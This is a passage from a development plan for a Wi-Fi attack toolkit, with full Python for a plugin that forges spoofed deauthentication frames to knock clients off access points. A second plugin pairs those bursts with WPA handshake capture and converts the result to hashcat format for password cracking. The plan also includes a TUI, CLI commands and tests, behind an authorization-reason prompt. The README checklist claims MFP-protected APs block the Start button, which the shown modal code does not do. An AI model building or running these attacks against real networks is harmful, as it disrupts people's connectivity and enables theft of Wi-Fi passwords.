source. Used directly (CLI subcommand) or as a child of HandshakePlugin to
provoke a client reconnect.
"""

from __future__ import annotations

import time
from typing import Any

import click

from cyberm4fia_wifi.core.auth import AuthorizationGate, PluginRisk
from cyberm4fia_wifi.core.events import DeauthSent, EventBus
from cyberm4fia_wifi.plugins.base import Plugin, PluginContext

_BROADCAST = "ff:ff:ff:ff:ff:ff"


def _build_frame(*, src_bssid: str, dst: str) -> Any:
    """Construct one RadioTap+Dot11 deauth frame. Reason 7 = class-3 frame."""
    import scapy.all as s  # noqa: PLC0415 — lazy import

    return s.RadioTap() / s.Dot11(
        type=0, subtype=12,
        addr1=dst,
        addr2=src_bssid,
        addr3=src_bssid,
    ) / s.Dot11Deauth(reason=7)


class DeauthPlugin(Plugin):
    name = "deauth"
    risk = PluginRisk.HIGH
    requires_injection = True

    def register_cli(self, group: click.Group) -> None:
        @group.command(name=self.name, help="Send a burst of deauth frames (risk=high)")
        @click.option("--target", "-t", required=True, help="AP BSSID to spoof")
        @click.option(
            "--client", "-c", required=True,
            help="Target STA MAC or 'broadcast'",
        )
        @click.option("--count", "-n", default=8, show_default=True, type=int)
        @click.option(
            "--reason", "-r", "--i-am-authorized-to-do-this",
            "reason", required=True,
            help="Authorization reason, recorded verbatim in the audit log",
        )
        @click.pass_context
        def deauth_cmd(ctx: click.Context, target: str, client: str, count: int, reason: str) -> None:
            from cyberm4fia_wifi.cli import build_runtime_for

            runtime = build_runtime_for(ctx)
            target_station = None if client.lower() in ("broadcast", "ff:ff:ff:ff:ff:ff") else client
            rc = self.execute(
                bus=runtime.bus,
                gate=runtime.gate,
                iface=runtime.adapter.iface,
                target_bssid=target,
                target_station=target_station,
                count=count,
                reason=reason,
            )
            ctx.exit(rc)

    def execute(
        self,
        *,
        bus: EventBus,
        gate: AuthorizationGate,
        iface: str,
        target_bssid: str,
        target_station: str | None,
        count: int = 8,
        reason: str = "",
    ) -> int:
        gate.check(plugin=self.name, risk=self.risk, target=target_bssid, reason=reason)

        import scapy.all as s  # noqa: PLC0415 — lazy import

        dst = (target_station or _BROADCAST).lower()
        src = target_bssid.lower()

        for i in range(1, count + 1):
            frame = _build_frame(src_bssid=src, dst=dst)
            s.sendp(frame, iface=iface, verbose=False)
            bus.publish(
                DeauthSent(
                    timestamp=time.time(),
                    target_bssid=src,
                    target_station=target_station,
                    sequence=i,
                    total=count,
                )
            )
        return 0

    def run(self, ctx: PluginContext) -> int:  # pragma: no cover — CLI path uses execute()
        raise NotImplementedError("call DeauthPlugin.execute(...) directly")
```

Add the plugin to the registry:

```python
# src/cyberm4fia_wifi/plugins/__init__.py
from cyberm4fia_wifi.plugins.base import Plugin, PluginContext
from cyberm4fia_wifi.plugins.deauth import DeauthPlugin
from cyberm4fia_wifi.plugins.scan import REGISTRY as _SCAN_REGISTRY, ScanPlugin

REGISTRY: list[Plugin] = list(_SCAN_REGISTRY) + [DeauthPlugin()]

__all__ = ["Plugin", "PluginContext", "REGISTRY", "ScanPlugin", "DeauthPlugin"]
```

- [ ] **Step 4: Run tests to verify pass**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_deauth_plugin.py -v`
Expected: All three pass.

- [ ] **Step 5: Smoke-check the CLI surface**

Run: `PYTHONPATH=src python3 -m cyberm4fia_wifi.cli deauth --help`
Expected: help text lists `--target`, `--client`, `--count`, `--reason`.

- [ ] **Step 6: Commit**

```bash
git add src/cyberm4fia_wifi/plugins/deauth.py src/cyberm4fia_wifi/plugins/__init__.py tests/unit/core/test_deauth_plugin.py
git commit -m "feat(plugins): DeauthPlugin + cyberm4fia deauth subcommand

Forges N RadioTap+Dot11+Dot11Deauth frames (reason=7) with the AP's
BSSID spoofed in addr2/addr3 and the target STA (or broadcast) in
addr1. Each frame triggers a DeauthSent event for live TUI logging.

Auth gate enforces risk=high → reason required in every mode; the CLI
exposes the friendly --reason alias plus the long --i-am-authorized-
to-do-this form for backwards compatibility.

Plugin registered in REGISTRY so the CLI sees the new 'deauth'
subcommand at startup."
```

---

## Task 8: `plugins/handshake.py` + CLI subcommand

**Files:**
- Create: `src/cyberm4fia_wifi/plugins/handshake.py`
- Modify: `src/cyberm4fia_wifi/plugins/__init__.py` (REGISTRY)
- Create: `tests/unit/core/test_handshake_plugin.py`

- [ ] **Step 1: Write failing tests**

Create `tests/unit/core/test_handshake_plugin.py`:

```python
"""Tests for the HandshakePlugin state machine + artifact write."""

from __future__ import annotations

from pathlib import Path

import pytest

scapy = pytest.importorskip("scapy.all")
from scapy.all import Ether  # noqa: E402

from cyberm4fia_wifi.core.auth import AuthorizationGate, AuthzConfig, Mode
from cyberm4fia_wifi.core.events import EAPOLCapture, EventBus, HandshakeComplete
from cyberm4fia_wifi.plugins.handshake import HandshakePlugin


@pytest.fixture
def gate(tmp_config_home) -> AuthorizationGate:
    g = AuthorizationGate.from_xdg()
    g.set_config(AuthzConfig(mode=Mode.LAB, acknowledged_at="x"))
    return g


def _eapol(bssid: str, sta: str, mi: int) -> EAPOLCapture:
    return EAPOLCapture(
        timestamp=100.0 + mi,
        bssid=bssid,
        station=sta,
        message_index=mi,
        raw=bytes(Ether() / b"x"),   # any non-empty payload
    )


class TestHandshakeStateMachine:
    def test_emits_handshake_complete_when_all_four_messages_seen(
        self,
        gate,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        # Redirect captures dir to tmp_path
        from cyberm4fia_wifi.utils import paths
        monkeypatch.setattr(paths, "_CAPTURES", tmp_path / "captures")

        # Pretend hcxpcapngtool said "valid"
        monkeypatch.setattr(
            "cyberm4fia_wifi.utils.hcxtools.convert_to_22000",
            lambda p: p.with_suffix(".22000"),
        )

        bus = EventBus()
        completes: list[HandshakeComplete] = []
        bus.subscribe(HandshakeComplete, completes.append)

        plugin = HandshakePlugin()
        plugin._arm(
            bus=bus, gate=gate, iface="wlan0mon",
            target_bssid="aa:bb:cc:dd:ee:01",
            target_station="11:22:33:44:55:66",
            essid="MyHome",
            reason="lab",
        )

        for mi in (1, 2, 3, 4):
            bus.publish(_eapol("aa:bb:cc:dd:ee:01", "11:22:33:44:55:66", mi))

        assert len(completes) == 1
        evt = completes[0]
        assert evt.valid_by_hcxtool is True
        assert evt.pcap_path.endswith(".pcap")
        assert evt.hashcat_path is not None and evt.hashcat_path.endswith(".22000")
        assert Path(evt.pcap_path).exists()

    def test_partial_capture_no_complete_event(
        self,
        gate,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from cyberm4fia_wifi.utils import paths
        monkeypatch.setattr(paths, "_CAPTURES", tmp_path / "captures")

        bus = EventBus()
        completes: list[HandshakeComplete] = []
        bus.subscribe(HandshakeComplete, completes.append)

        plugin = HandshakePlugin()
        plugin._arm(
            bus=bus, gate=gate, iface="wlan0mon",
            target_bssid="aa:bb:cc:dd:ee:01",
            target_station="11:22:33:44:55:66",
            essid="MyHome",
            reason="lab",
        )
        # Only M1 + M2 — handshake not complete.
        for mi in (1, 2):
            bus.publish(_eapol("aa:bb:cc:dd:ee:01", "11:22:33:44:55:66", mi))

        assert completes == []

    def test_ignores_eapol_for_other_bssid(
        self,
        gate,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from cyberm4fia_wifi.utils import paths
        monkeypatch.setattr(paths, "_CAPTURES", tmp_path / "captures")
        monkeypatch.setattr(
            "cyberm4fia_wifi.utils.hcxtools.convert_to_22000",
            lambda p: p.with_suffix(".22000"),
        )

        bus = EventBus()
        completes: list[HandshakeComplete] = []
        bus.subscribe(HandshakeComplete, completes.append)

        plugin = HandshakePlugin()
        plugin._arm(
            bus=bus, gate=gate, iface="wlan0mon",
            target_bssid="aa:bb:cc:dd:ee:01",
            target_station="11:22:33:44:55:66",
            essid="MyHome",
            reason="lab",
        )
        for mi in (1, 2, 3, 4):
            bus.publish(_eapol("zz:zz:zz:zz:zz:zz", "11:22:33:44:55:66", mi))

        assert completes == []
```

- [ ] **Step 2: Run tests to verify failures**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_handshake_plugin.py -v`
Expected: All three fail with `ModuleNotFoundError`.

- [ ] **Step 3: Implement the plugin**

Create `src/cyberm4fia_wifi/plugins/handshake.py`:

```python
"""Handshake plugin — risk=active, or risk=high when auto-deauth is on.

Locks the radio to the target AP's channel, listens for EAPOL key frames,
runs a native M1-M4 state machine for the TUI's live progress display, then
delegates final validation to hcxpcapngtool. Optionally pulls in DeauthPlugin
to provoke a client reconnect.
"""

from __future__ import annotations

import threading
import time
from pathlib import Path
from typing import Any

import click

from cyberm4fia_wifi.core.auth import AuthorizationGate, PluginRisk
from cyberm4fia_wifi.core.events import (
    EAPOLCapture,
    EventBus,
    HandshakeComplete,
)
from cyberm4fia_wifi.plugins.base import Plugin, PluginContext
from cyberm4fia_wifi.plugins.deauth import DeauthPlugin
from cyberm4fia_wifi.utils.hcxtools import convert_to_22000
from cyberm4fia_wifi.utils.paths import handshake_path
from cyberm4fia_wifi.utils.pcap_writer import append_packets


class HandshakePlugin(Plugin):
    name = "handshake"
    risk = PluginRisk.ACTIVE
    requires_injection = False  # auto-deauth elevates this at call time

    # ---- shared state per active capture ----------------------------------
    def __init__(self) -> None:
        self._bus: EventBus | None = None
        self._target_bssid: str | None = None
        self._target_station: str | None = None
        self._pcap_path: Path | None = None
        self._state: set[int] = set()
        self._completed = threading.Event()

    # ---- CLI surface -------------------------------------------------------
    def register_cli(self, group: click.Group) -> None:
        @group.command(name=self.name, help="Capture WPA 4-way handshake")
        @click.option("--target", "-t", required=True, help="AP BSSID")
        @click.option("--client", "-c", default="broadcast", show_default=True)
        @click.option("--no-deauth", is_flag=True, help="Disable auto-deauth")
        @click.option("--count", "-n", default=8, show_default=True, type=int)
        @click.option("--timeout", default=60, show_default=True, type=int)
        @click.option(
            "--reason", "-r", "--i-am-authorized-to-do-this",
            "reason", required=True,
        )
        @click.pass_context
        def handshake_cmd(
            ctx: click.Context,
            target: str,
            client: str,
            no_deauth: bool,
            count: int,
            timeout: int,
            reason: str,
        ) -> None:
            from cyberm4fia_wifi.cli import build_runtime_for

            runtime = build_runtime_for(ctx)
            target_station = None if client.lower() == "broadcast" else client
            rc = self.execute(
                bus=runtime.bus,
                gate=runtime.gate,
                iface=runtime.adapter.iface,
                target_bssid=target,
                target_station=target_station,
                essid=None,
                auto_deauth=not no_deauth,
                deauth_count=count,
                timeout=timeout,
                reason=reason,
            )
            ctx.exit(rc)

    # ---- main entry --------------------------------------------------------
    def execute(
        self,
        *,
        bus: EventBus,
        gate: AuthorizationGate,
        iface: str,
        target_bssid: str,
        target_station: str | None,
        essid: str | None,
        auto_deauth: bool = True,
        deauth_count: int = 8,
        timeout: float = 60.0,
        reason: str,
    ) -> int:
        effective_risk = PluginRisk.HIGH if auto_deauth else self.risk
        gate.check(
            plugin=self.name,
            risk=effective_risk,
            target=target_bssid,
            reason=reason,
        )

        self._arm(
            bus=bus, gate=gate, iface=iface,
            target_bssid=target_bssid,
            target_station=target_station,
            essid=essid, reason=reason,
        )

        try:
            if auto_deauth:
                DeauthPlugin().execute(
                    bus=bus, gate=gate, iface=iface,
                    target_bssid=target_bssid,
                    target_station=target_station,
                    count=deauth_count, reason=reason,
                )
            # Wait for the state machine to flip _completed, or for timeout.
            self._completed.wait(timeout=timeout)
            return 0 if self._completed.is_set() else 1
        finally:
            self._disarm(bus)

    # ---- state machine ----------------------------------------------------
    def _arm(
        self,
        *,
        bus: EventBus,
        gate: AuthorizationGate,
        iface: str,
        target_bssid: str,
        target_station: str | None,
        essid: str | None,
        reason: str,
    ) -> None:
        self._bus = bus
        self._target_bssid = target_bssid.lower()
        self._target_station = target_station.lower() if target_station else None
        self._pcap_path = handshake_path(essid, target_bssid)
        self._state = set()
        self._completed.clear()
        bus.subscribe(EAPOLCapture, self._on_eapol)

    def _disarm(self, bus: EventBus) -> None:
        bus.unsubscribe(EAPOLCapture, self._on_eapol)

    def _on_eapol(self, evt: EAPOLCapture) -> None:
        if self._bus is None or self._pcap_path is None:
            return
        if evt.bssid.lower() != self._target_bssid:
            return
        if self._target_station and evt.station.lower() != self._target_station:
            return

        # Persist every frame so even partial captures are diagnostically
        # useful. raw is the full Dot11 frame bytes — wrap it as scapy
        # accepts a bytes payload via Raw() inside Ether to keep PcapWriter
        # happy.
        import scapy.all as s
        append_packets(self._pcap_path, [s.Ether(evt.raw)] if len(evt.raw) > 14 else [s.Raw(load=evt.raw)])

        if evt.message_index is not None:
            self._state.add(evt.message_index)

        # Validate once we have at least M1+M2 (sufficient for crack).
        if {1, 2}.issubset(self._state):
            hashcat = convert_to_22000(self._pcap_path)
            valid = hashcat is not None or {1, 2, 3, 4}.issubset(self._state)
            self._bus.publish(
                HandshakeComplete(
                    timestamp=time.time(),
                    bssid=self._target_bssid,
                    station=evt.station,
                    pcap_path=str(self._pcap_path),
                    hashcat_path=str(hashcat) if hashcat else None,
                    valid_by_hcxtool=hashcat is not None,
                )
            )
            self._completed.set()

    def run(self, ctx: PluginContext) -> int:  # pragma: no cover — CLI uses execute()
        raise NotImplementedError("call HandshakePlugin.execute(...) directly")
```

Add it to the registry:

```python
# src/cyberm4fia_wifi/plugins/__init__.py
from cyberm4fia_wifi.plugins.base import Plugin, PluginContext
from cyberm4fia_wifi.plugins.deauth import DeauthPlugin
from cyberm4fia_wifi.plugins.handshake import HandshakePlugin
from cyberm4fia_wifi.plugins.scan import REGISTRY as _SCAN_REGISTRY, ScanPlugin

REGISTRY: list[Plugin] = list(_SCAN_REGISTRY) + [DeauthPlugin(), HandshakePlugin()]

__all__ = ["Plugin", "PluginContext", "REGISTRY", "ScanPlugin", "DeauthPlugin", "HandshakePlugin"]
```

- [ ] **Step 4: Run tests to verify pass**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_handshake_plugin.py -v`
Expected: All three pass.

- [ ] **Step 5: Smoke-check the CLI surface**

Run: `PYTHONPATH=src python3 -m cyberm4fia_wifi.cli handshake --help`
Expected: help text lists `--target`, `--client`, `--no-deauth`, `--count`, `--timeout`, `--reason`.

- [ ] **Step 6: Commit**

```bash
git add src/cyberm4fia_wifi/plugins/handshake.py src/cyberm4fia_wifi/plugins/__init__.py tests/unit/core/test_handshake_plugin.py
git commit -m "feat(plugins): HandshakePlugin with M1-M4 state machine

Subscribes to EAPOLCapture, filters by target BSSID/STA, appends every
frame to captures/handshakes/<essid>_<bssid>_<ts>.pcap, advances a
{1,2,3,4} state set, and as soon as {1,2} appears, delegates to
hcxpcapngtool for final validation. valid_by_hcxtool surfaces the
oracle's verdict.

execute() re-runs the auth gate as risk=HIGH when auto_deauth=True;
the child DeauthPlugin's own gate call would catch it too, but this
prevents wasted radio time when the operator's reason is empty.

Registered with the plugin registry so 'cyberm4fia handshake' lands."
```

---

## Task 9: `tui/modals.py` HandshakeModal

**Files:**
- Create: `src/cyberm4fia_wifi/tui/modals.py`
- Create: `tests/unit/core/test_handshake_modal.py`

- [ ] **Step 1: Write failing test**

Create `tests/unit/core/test_handshake_modal.py`:

```python
"""Smoke tests for the HandshakeModal."""

from __future__ import annotations

import pytest

textual = pytest.importorskip("textual")

from textual.app import App

from cyberm4fia_wifi.tui.modals import HandshakeModal, HandshakeRequest


class _Harness(App):
    def __init__(self, ap_bssid: str, clients: list[str], mfp: str) -> None:
        super().__init__()
        self._ap_bssid = ap_bssid
        self._clients = clients
        self._mfp = mfp

    def on_mount(self) -> None:
        self.push_screen(
            HandshakeModal(
                ap_bssid=self._ap_bssid,
                ap_essid="MyHome",
                ap_channel=6,
                clients=self._clients,
                mfp_status=self._mfp,
            )
        )


@pytest.mark.asyncio
async def test_modal_blocks_start_when_reason_empty() -> None:
    app = _Harness("aa:bb:cc:dd:ee:01", ["11:22:33:44:55:66"], "none")
    async with app.run_test() as pilot:
        await pilot.pause()
        # The Start button should be disabled while Reason is empty.
        start = app.query_one("#start_btn")
        assert start.disabled is True


@pytest.mark.asyncio
async def test_modal_warns_when_mfp_required() -> None:
    app = _Harness("aa:bb:cc:dd:ee:01", [], "required")
    async with app.run_test() as pilot:
        await pilot.pause()
        warning = app.query_one("#mfp_warn")
        # Warning row carries the literal text 'MFP required' (case-insensitive).
        assert "MFP" in str(warning.renderable)
```

- [ ] **Step 2: Run tests to verify failures**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_handshake_modal.py -v`
Expected: Both fail with `ModuleNotFoundError`.

- [ ] **Step 3: Implement the modal**

Create `src/cyberm4fia_wifi/tui/modals.py`:

```python
"""Confirm-action modals for risk=active/high plugins."""

from __future__ import annotations

from dataclasses import dataclass

from textual.app import ComposeResult
from textual.containers import Container, Horizontal, Vertical
from textual.screen import ModalScreen
from textual.widgets import Button, Checkbox, Input, Label, Select, Static


@dataclass
class HandshakeRequest:
    target_station: str | None
    auto_deauth: bool
    deauth_count: int
    timeout: int
    reason: str
    override_mfp: bool


class HandshakeModal(ModalScreen[HandshakeRequest | None]):
    DEFAULT_CSS = """
    HandshakeModal { align: center middle; }
    #modal { width: 70; height: auto; border: round $primary; padding: 1 2; }
    #mfp_warn { color: $warning; margin: 0 0 1 0; }
    #mfp_warn.required { color: $error; }
    Input, Select { width: 100%; }
    Horizontal#row_buttons { align: right middle; height: 3; }
    """

    def __init__(
        self,
        *,
        ap_bssid: str,
        ap_essid: str | None,
        ap_channel: int,
        clients: list[str],
        mfp_status: str,
    ) -> None:
        super().__init__()
        self._bssid = ap_bssid
        self._essid = ap_essid or "<hidden>"
        self._channel = ap_channel
        self._clients = clients
        self._mfp = mfp_status

    def compose(self) -> ComposeResult:
        with Container(id="modal"):
            yield Label(f"Capture handshake for {self._essid} ({self._bssid}, ch {self._channel})")
            yield Static(self._mfp_text(), id="mfp_warn", classes=self._mfp_class())
            options = [("broadcast", "broadcast")] + [(c, c) for c in self._clients]
            yield Label("Target STA:")
            yield Select(options=options, value="broadcast", id="sta_select")
            yield Checkbox("Auto-deauth", value=True, id="auto_deauth")
            yield Label("Deauth count:")
            yield Input(value="8", id="count_input")
            yield Label("Timeout (s):")
            yield Input(value="60", id="timeout_input")
            yield Label("Reason (required):")
            yield Input(placeholder="why you're allowed to do this", id="reason_input")
            if self._mfp == "required":
                yield Checkbox(
                    "Override MFP (probably ineffective)",
                    value=False, id="mfp_override",
                )
            with Horizontal(id="row_buttons"):
                yield Button("Cancel", id="cancel_btn")
                yield Button("Start", id="start_btn", variant="primary", disabled=True)

    def _mfp_text(self) -> str:
        if self._mfp == "required":
            return "MFP required on this AP — deauth will be ignored unless overridden."
        if self._mfp == "capable":
            return "MFP capable — deauth may be inconsistent."
        return "MFP not detected."

    def _mfp_class(self) -> str:
        return "required" if self._mfp == "required" else ""

    def on_input_changed(self, event: Input.Changed) -> None:
        if event.input.id == "reason_input":
            start = self.query_one("#start_btn", Button)
            start.disabled = not event.value.strip()

    def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "cancel_btn":
            self.dismiss(None)
            return
        if event.button.id == "start_btn":
            sta = self.query_one("#sta_select", Select).value
            target_sta: str | None = None if sta == "broadcast" else str(sta)
            override = False
            if self._mfp == "required":
                override = bool(self.query_one("#mfp_override", Checkbox).value)
            self.dismiss(
                HandshakeRequest(
                    target_station=target_sta,
                    auto_deauth=self.query_one("#auto_deauth", Checkbox).value,
                    deauth_count=int(self.query_one("#count_input", Input).value or "8"),
                    timeout=int(self.query_one("#timeout_input", Input).value or "60"),
                    reason=self.query_one("#reason_input", Input).value.strip(),
                    override_mfp=override,
                )
            )
```

- [ ] **Step 4: Run tests to verify pass**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_handshake_modal.py -v`
Expected: Both pass.

- [ ] **Step 5: Commit**

```bash
git add src/cyberm4fia_wifi/tui/modals.py tests/unit/core/test_handshake_modal.py
git commit -m "feat(tui): HandshakeModal confirm dialog

ModalScreen subclass with seven inputs (target STA, auto-deauth,
deauth count, timeout, reason, MFP override if applicable). Start
button is disabled until Reason has at least one non-whitespace
char — operator must justify a high-risk action.

When the AP's mfp_status is 'required', a red warning row appears
plus an extra 'Override MFP' checkbox; without the override the
operator can still submit but the audit log will reflect the choice."
```

---

## Task 10: TUI integration (`d`/`h` keybindings, action handlers, log formatters)

**Files:**
- Modify: `src/cyberm4fia_wifi/tui/app.py`
- Modify: `tests/unit/core/test_tui_smoke.py`

- [ ] **Step 1: Write failing test**

Append to `tests/unit/core/test_tui_smoke.py`:

```python
@pytest.mark.asyncio
async def test_d_and_h_bindings_present() -> None:
    sess = Session()
    _populate(sess)
    app = ScanApp(session=sess, bus=EventBus(), iface="wlan0mon", driver="ath9k_htc", mode="lab")

    async with app.run_test() as pilot:
        await pilot.pause()
        keys = {b.key for b in app.BINDINGS}
        assert "d" in keys
        assert "h" in keys
```

- [ ] **Step 2: Run test to verify failure**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_tui_smoke.py::test_d_and_h_bindings_present -v`
Expected: FAIL — `d` / `h` not in bindings.

- [ ] **Step 3: Add the bindings + actions**

In `src/cyberm4fia_wifi/tui/app.py`, extend `BINDINGS`:

```python
    BINDINGS = [
        Binding("f1", "help", "Help", show=False),
        Binding("f2", "cycle_sort", "Sort"),
        Binding("f3", "filter_prompt", "Filter"),
        Binding("f4", "lock_channel", "Lock CH"),
        Binding("f5", "toggle_pause", "Pause"),
        Binding("d", "deauth_prompt", "Deauth"),
        Binding("h", "handshake_prompt", "Handshake"),
        Binding("q,f10", "quit", "Quit"),
    ]
```

Add the new event imports at the top of the file:

```python
from cyberm4fia_wifi.core.events import (
    BeaconSeen,
    ChannelChanged,
    ClientSeen,
    DeauthSent,
    EAPOLCapture,
    Event,
    EventBus,
    HandshakeComplete,
    ProbeSeen,
)
```

Add the four new event formatters in `_log_event` (next to the existing branches):

```python
        elif isinstance(evt, DeauthSent):
            who = evt.target_station or "broadcast"
            line = f"[deauth] → {who} ({evt.sequence}/{evt.total}) src={evt.target_bssid}"
        elif isinstance(evt, EAPOLCapture):
            mi = evt.message_index or "?"
            line = f"[eapol ] M{mi}/4  {evt.bssid} ↔ {evt.station}"
        elif isinstance(evt, HandshakeComplete):
            verdict = "valid" if evt.valid_by_hcxtool else "partial"
            line = f"[handshake] {verdict} → {evt.pcap_path}"
```

Subscribe to the three new event types in `on_mount`:

```python
        self._bus.subscribe(DeauthSent, self._log_event)
        self._bus.subscribe(EAPOLCapture, self._log_event)
        self._bus.subscribe(HandshakeComplete, self._log_event)
```

Add the two action handlers (at the bottom of the class):

```python
    async def action_handshake_prompt(self) -> None:
        if not self._selected_bssid:
            self.notify("select an AP first", severity="warning")
            return
        ap = next(
            (a for a in self._session.aps_snapshot() if a.bssid == self._selected_bssid),
            None,
        )
        if ap is None:
            return
        from cyberm4fia_wifi.tui.modals import HandshakeModal

        clients = [c.station for c in self._session.clients_of(ap.bssid)]
        req = await self.push_screen_wait(
            HandshakeModal(
                ap_bssid=ap.bssid,
                ap_essid=ap.essid,
                ap_channel=ap.channel,
                clients=clients,
                mfp_status=ap.mfp_status,
            )
        )
        if req is None:
            self.notify("cancelled")
            return
        # Lock channel first so we don't lose frames during the burst.
        if self._hopper is not None:
            self._hopper.lock(ap.channel)

        from cyberm4fia_wifi.plugins.handshake import HandshakePlugin

        plugin = HandshakePlugin()
        # Run on a worker so we don't block the UI loop.
        self.run_worker(
            lambda: plugin.execute(
                bus=self._bus,
                gate=_resolve_gate(),
                iface=self._iface,
                target_bssid=ap.bssid,
                target_station=req.target_station,
                essid=ap.essid,
                auto_deauth=req.auto_deauth,
                deauth_count=req.deauth_count,
                timeout=req.timeout,
                reason=req.reason,
            ),
            thread=True,
            description="handshake",
        )

    async def action_deauth_prompt(self) -> None:
        # Deauth alone is rare; usually the operator wants the full handshake
        # flow. We surface a hint pointing at 'h' and let advanced users use
        # the CLI for standalone deauth.
        self.notify(
            "Use 'h' for handshake (includes auto-deauth). "
            "Standalone deauth via the CLI: cyberm4fia deauth ...",
            timeout=8,
        )
```

Add the `_resolve_gate` helper at module bottom (re-uses existing XDG construction):

```python
def _resolve_gate():
    from cyberm4fia_wifi.core.auth import AuthorizationGate

    return AuthorizationGate.from_xdg()
```

- [ ] **Step 4: Run tests to verify pass**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_tui_smoke.py -v`
Expected: All pass (existing 3 + new binding test).

- [ ] **Step 5: Commit**

```bash
git add src/cyberm4fia_wifi/tui/app.py tests/unit/core/test_tui_smoke.py
git commit -m "feat(tui): wire d/h bindings, log formatters, handshake worker

Pressing 'h' on a selected AP opens HandshakeModal; submit launches
HandshakePlugin on a worker thread (so the 250 ms UI tick stays
responsive). 'd' surfaces a hint pointing at 'h' — standalone deauth
is reserved for the CLI to keep the in-TUI flow focused on the
'capture a handshake' use case.

Live Events panel now renders DeauthSent / EAPOLCapture / Handshake-
Complete events with bracketed tags ([deauth] / [eapol] / [handshake])
so the operator can scan the log for state transitions at a glance."
```

---

## Task 11: AP Details panel — MFP + Handshakes rows

**Files:**
- Modify: `src/cyberm4fia_wifi/tui/app.py`
- Modify: `tests/unit/core/test_tui_smoke.py`

- [ ] **Step 1: Write failing test**

Append to `tests/unit/core/test_tui_smoke.py`:

```python
@pytest.mark.asyncio
async def test_ap_details_shows_mfp_and_handshake_count() -> None:
    sess = Session()
    from cyberm4fia_wifi.core.events import BeaconSeen, HandshakeComplete

    sess.handle_event(
        BeaconSeen(
            timestamp=100.0,
            bssid="aa:bb:cc:dd:ee:01",
            essid="MyHome",
            channel=6,
            encryption="WPA2-PSK",
            signal_dbm=-42,
            mfp_status="required",
        )
    )
    sess.handle_event(
        HandshakeComplete(
            timestamp=101.0,
            bssid="aa:bb:cc:dd:ee:01",
            station="11:22:33:44:55:66",
            pcap_path="/tmp/x.pcap",
            hashcat_path=None,
            valid_by_hcxtool=True,
        )
    )

    app = ScanApp(session=sess, bus=EventBus(), iface="wlan0mon", driver="ath9k_htc", mode="lab")
    async with app.run_test() as pilot:
        app._selected_bssid = "aa:bb:cc:dd:ee:01"
        app._tick()
        await pilot.pause()
        details = app.query_one("#details").renderable
        text = str(details)
        assert "MFP" in text
        assert "required" in text
        assert "Handshakes" in text
        assert " 1 " in text or "= 1" in text
```

- [ ] **Step 2: Run test to verify failure**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_tui_smoke.py::test_ap_details_shows_mfp_and_handshake_count -v`
Expected: FAIL — neither row is rendered yet.

- [ ] **Step 3: Extend `_format_details`**

In `src/cyberm4fia_wifi/tui/app.py`, inside `_format_details`, append two new rows right before the final `("Seen", ...)` row. Locate the existing block ending with `("WPS", ...)` and add:

```python
            "\n",
            ("MFP      ", "dim"),
            (
                ap.mfp_status,
                "error" if ap.mfp_status == "required"
                else "warning" if ap.mfp_status == "capable"
                else "dim",
            ),
            "\n",
            ("Handshakes ", "dim"),
            (
                str(ap.handshake_count),
                "bold green" if ap.handshake_count else "dim",
            ),
```

- [ ] **Step 4: Run tests to verify pass**

Run: `PYTHONPATH=src python3 -m pytest tests/unit/core/test_tui_smoke.py -v`
Expected: All pass.

- [ ] **Step 5: Commit**

```bash
git add src/cyberm4fia_wifi/tui/app.py tests/unit/core/test_tui_smoke.py
git commit -m "feat(tui): AP Details shows MFP status + handshake count

Two new rows under the selected AP's details: MFP (red 'required',
yellow 'capable', dim for 'none' / 'unknown') and Handshakes (bold
green when > 0, dim otherwise). Gives the operator at-a-glance signal
on (a) whether deauth is worth attempting and (b) whether the capture
worked."
```

---

## Task 12: README + manual acceptance checklist

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Append the Phase 2a section**

Append to `README.md` after the existing Phase 1 acceptance checklist section:

```markdown
---

## Phase 2a — Capture a Handshake

```bash
# From inside the scan TUI:
./cyberm4fia.sh scan
# arrow keys to pick the AP, then press 'h'
# fill the modal (Reason is required), Start.

# Or one-shot via the CLI (no TUI):
./cyberm4fia.sh handshake \
    --target AA:BB:CC:DD:EE:01 \
    --client 11:22:33:44:55:66 \
    --reason "my own router, lab test"
```

Output lands in `captures/handshakes/`:

```
captures/handshakes/MyHome_aabbccddee01_20260527-142315.pcap
captures/handshakes/MyHome_aabbccddee01_20260527-142315.22000   # if hcxpcapngtool installed
```

### Phase 2a — Manual RF Acceptance Checklist

Run against your own router. Tests cannot exercise the real radio path.

- [ ] `./cyberm4fia.sh handshake --target <own router> --reason "..."` produces a `.pcap` ≥ 1 KB.
- [ ] The same run also writes a `.22000` if `hcxpcapngtool` is installed.
- [ ] Independent `hcxpcapngtool` re-run accepts the `.pcap` as a valid handshake.
- [ ] In the TUI, pressing `h` opens the modal; submit runs end-to-end; cancel closes cleanly without leaving the radio locked.
- [ ] Live Events panel shows `[deauth]` then `[eapol]` then `[handshake]` lines in order.
- [ ] AP Details panel `Handshakes` counter increments after a successful capture.
- [ ] Audit log gets one line per `deauth` and one per `handshake` invocation.
- [ ] An AP with MFP=required produces a blocked Start button until the Override checkbox is set.

### hcxpcapngtool

Install with:

```bash
sudo apt install hcxtools
```

If absent, the tool still saves the `.pcap` and writes a one-time WARN to the log; you can convert manually later.
```

- [ ] **Step 2: Commit**

```bash
git add README.md
git commit -m "docs: README — Phase 2a quickstart + acceptance checklist

Adds the 'press h to capture' flow, the equivalent CLI invocation,
the artifact layout under captures/handshakes/, and the manual RF
acceptance checklist the operator must run before tagging Phase 2a
complete on their environment."
```

---

## Wrap-Up

- [ ] **Run the full suite + lint + type-check**

```bash
PYTHONPATH=src python3 -m pytest -q
PYTHONPATH=src python3 -m pytest --cov=src/cyberm4fia_wifi --cov-report=term-missing
ruff check . && ruff format --check .
mypy src/cyberm4fia_wifi/core src/cyberm4fia_wifi/utils src/cyberm4fia_wifi/plugins
```

